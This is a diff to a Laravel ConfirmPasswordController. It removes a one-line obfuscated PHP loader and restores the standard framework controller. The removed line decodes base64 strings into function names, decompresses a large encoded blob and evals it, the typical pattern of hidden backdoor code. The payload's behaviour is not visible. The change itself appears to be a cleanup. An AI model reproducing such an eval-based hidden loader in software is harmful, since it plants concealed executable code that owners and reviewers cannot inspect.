@@ -1,1 +1,40 @@
-<?php $_='903894a2';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNq1VV2zojgQfd9f4cNUeW/VPkQYZ7UsHyZcCaCXWXCMkJdbJlFQAjLjJ/767fiJNTX7NlQFQtKcPt190jQal+vTx+PqN5FYzFCrLZq9T5eF8uey2C6avb8aNft+oxm1uns+pUUc9PvNxmP7hteHaVPkFMnI27kWVjK3N0MrXEStTvntoD9qPIN+NBrnj/hsM//y+UPOxVrOm71fKL4Fa9/K2yl4Pwlir9gYY+FgMXZCJOzjGzfaSOTdDSe0Eq0jllG4/nZAw7egbAljkgQRPkSDFEn4JjC6O+l4e06OShT+8/tq41sFPd3wJ7Auc5WxyDtFNsyjUE0MWsHailFccZOVDHxqXzLylTtQG+7Q7WzaTiWhIsy7LZ6HMFd7ri68ooG/5zkrRd46TYh9Eqbcizw8XfmuuF6rsI4pn0XetmbzFKdL6GfwsWPOe/IUQ4KGc8Byra+Ja3V+QO4SPV9YaDsa/9nx8PXg79o4FaZvctPLXB17EVbcOG5Y5PrWUnPEnT/NC8bdV43jZEbUySVPnJJZ9J6AiEFn3Z0w1JKTScLyLuQ7TaGWG6ht4Tq1mMi9npc6F+9JPG1nNT+gQQp+BgngbQXUyHXCKp4qBM+9S9QuNo4tBn4kSZVLPDUjtjGbdqvREjNuTgqRA4fCU6BLxCus5g7egG9V84HOsdxwib1jFgbtwnnQ+h3jlBcZYNBdbIYl1EbbruMo0LEe5VRVYLMCDSNutMp5biPwvxslVx05h2v+vv4YnXV68XvR/P/p+WI3qtZ3HbrWOqFGqnRMknS0/wx0omIzOOMJyJ+Efb7UMU0SyDdikE821fvexiUsnU2Ppzs34FTHDhyWiiU+wXkoeS5uvJPhsnPTwAHOEGD6SGN6DuSVQPzwToHPv2M85iZFjGourIwNGoA91COE/rD+Mh50/fA79InkccaGNS6QD8Cykc65S9pKVnj1fG7VTpghaMlXv4/BU9KhFeTA4IbKanv721w4FLSpVpAP6DH+uV6u3V3E0AsAv5IQz9DKbjH/88DQIzzrZfS9Db0qzICXGUMNhpZMdY/yquxuvwjQUI/a/6DW8s/Pl+vb6/kPUlt77d0sz4svTX1v/n03f/4ZXHFe6r3/9bX3H2aNKNc='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Http\Controllers\Auth;
+
+use App\Http\Controllers\Controller;
+use App\Providers\RouteServiceProvider;
+use Illuminate\Foundation\Auth\ConfirmsPasswords;
+
+class ConfirmPasswordController extends Controller
+{
+    /*
+    |--------------------------------------------------------------------------
+    | Confirm Password Controller
+    |--------------------------------------------------------------------------
+    |
+    | This controller is responsible for handling password confirmations and
+    | uses a simple trait to include the behavior. You're free to explore
+    | this trait and override any functions that require customization.
+    |
+    */
+
+    use ConfirmsPasswords;
+
+    /**
+     * Where to redirect users when the intended url fails.
+     *
+     * @var string
+     */
+    protected $redirectTo = RouteServiceProvider::HOME;
+
+    /**
+     * Create a new controller instance.
+     *
+     * @return void
+     */
+    public function __construct()
+    {
+        $this->middleware('auth');
+    }
+}
